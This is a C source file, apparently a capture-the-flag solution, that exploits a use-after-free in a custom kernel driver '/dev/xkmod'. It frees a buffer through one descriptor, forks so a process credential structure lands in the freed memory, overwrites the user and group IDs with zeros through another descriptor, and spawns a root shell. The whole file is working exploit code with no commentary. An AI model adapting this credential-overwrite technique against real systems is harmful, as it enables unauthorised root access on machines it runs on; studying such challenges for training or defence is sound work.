#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>


typedef struct data{
    size_t *ptr;
    unsigned int offset;
    unsigned int length;
}Data;


void allocBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x1111111, data);
}


void editBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x6666666, data);
}


void readBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x7777777, data);
}


int main(void){
    int dev_fd[5];
    for (int i = 0; i < 5; i++) {
        dev_fd[i] = open("/dev/xkmod", O_RDONLY);
    }


    Data data;
    data.ptr = malloc(0x100);
    data.offset = 0;
    data.length = 0x50;

    allocBuf(dev_fd[0], &data);
    close(dev_fd[0]);


    int pid = fork();
    if (!pid){
        readBuf(dev_fd[1], &data);

        if (((int*)(data.ptr))[3] == 1000) {
            for (int i = 0; i < 10; i++){
                data.ptr[i] = 0;
            }
            editBuf(dev_fd[1], &data);
            if (!getuid()){
                puts("[+] Get root.");
                setresuid(0, 0, 0);
                setresgid(0, 0, 0);
                system("/bin/sh");
                exit(EXIT_SUCCESS);
            }
        } else {
            puts("[x] Failed!");
            exit(EXIT_FAILURE);
        }

    }
    wait(NULL);
    

    return 0;
}